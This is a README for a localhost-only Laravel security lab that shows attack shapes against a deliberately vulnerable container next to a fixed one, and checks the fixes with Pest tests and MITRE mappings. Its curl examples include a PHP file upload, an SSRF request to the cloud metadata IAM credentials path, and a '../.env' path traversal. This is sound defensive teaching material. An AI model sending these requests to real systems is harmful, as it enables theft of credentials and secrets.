# Attack demo (localhost lab only)

High-level demonstration of **attack shapes** against the isolated Laravel compose stack. Do **not** run these against any host other than `127.0.0.1` lab ports.

Payloads are illustrative (`<?php echo 'lab'; ?>`). No weaponized shells, no Tor/bypass recipes, no targeting outside the Docker lab network.

## Prerequisites

```bash
docker compose up -d
# Fixed:      http://127.0.0.1:8080
# Vulnerable: http://127.0.0.1:8081
```

## 1) Unsafe upload shape (T1505.003)

```bash
echo "<?php echo 'lab'; ?>" > /tmp/lab-demo.php
curl -s -F "file=@/tmp/lab-demo.php;filename=lab-demo.php" http://127.0.0.1:8081/upload
```

Fixed mode rejects (expect HTTP 415):

```bash
curl -s -o /tmp/up-fixed.json -w "%{http_code}\n" \
  -F "file=@/tmp/lab-demo.php;filename=lab-demo.php" http://127.0.0.1:8080/upload
cat /tmp/up-fixed.json
```

**Fix validation:** `"error":"disallowed_extension"` (or related). Pest: `test_reject_php_upload`.

## 2) Webhook SSRF toward simulated metadata (T1552.005)

```bash
curl -s -X POST http://127.0.0.1:8081/webhook \
  -H 'Content-Type: application/json' \
  -d '{"callback_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-role"}'
```

Expect a body preview containing `FAKE` / `FAKEACCESSKEYIDLABONLY`. Not real credentials.

Fixed:

```bash
curl -s -X POST http://127.0.0.1:8080/webhook \
  -H 'Content-Type: application/json' \
  -H 'X-Webhook-Token: lab-webhook-token-change-me' \
  -d '{"callback_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/lab-role"}'
```

**Fix validation:** scheme/host/IP rejection. Pest: `test_ssrf_block_metadata_http`, `test_app_webhook_blocks_metadata`.

## 3) Missing webhook token (T1190 hardening)

```bash
curl -s -X POST http://127.0.0.1:8080/webhook \
  -H 'Content-Type: application/json' \
  -d '{"callback_url":"https://example.com/"}'
```

Expect `"error":"missing_or_invalid_token"`. Pest: `test_webhook_token_required_null`.

## 4) Path traversal / IDOR-style download (T1083)

```bash
curl -s "http://127.0.0.1:8081/download?file=../.env" | head
curl -s "http://127.0.0.1:8080/download?file=../.env"
```

Fixed expects JSON error (`invalid_name` / `path_outside_storage` / `not_found`). Pest: `test_no_path_traversal_download`.

Ownership (fixed): upload with `X-Lab-Owner: owner-a`, then download UUID with `owner-b` → `forbidden_owner`. Pest: `test_download_idor_blocked_for_other_owner`.

## 5) Happy-path upload + download (fixed)

```bash
echo "lab report" > /tmp/lab-notes.txt
curl -s -F "file=@/tmp/lab-notes.txt" -H 'X-Lab-Owner: owner-a' http://127.0.0.1:8080/upload
curl -s -H 'X-Lab-Owner: owner-a' -o /tmp/out.txt "http://127.0.0.1:8080/download?file=<stored_as>"
```

## MITRE map

| Demo step | Technique | Emphasize |
|-----------|-----------|-----------|
| PHP upload | T1505.003 | Prevent implant landing |
| Metadata SSRF | T1552.005 | Block credential theft path |
| Tokenless webhook | T1190 | Authenticate callbacks |
| Traversal / IDOR download | T1083 / IDOR | Jail + ownership |
| Outbound after upload | T1071.001 / T1105 | `detections/unusual_outbound_after_upload.yml` |

## After the demo

```bash
cd app && ./vendor/bin/pest --filter=LabSecurity
# or: docker compose --profile test run --rm tests
```
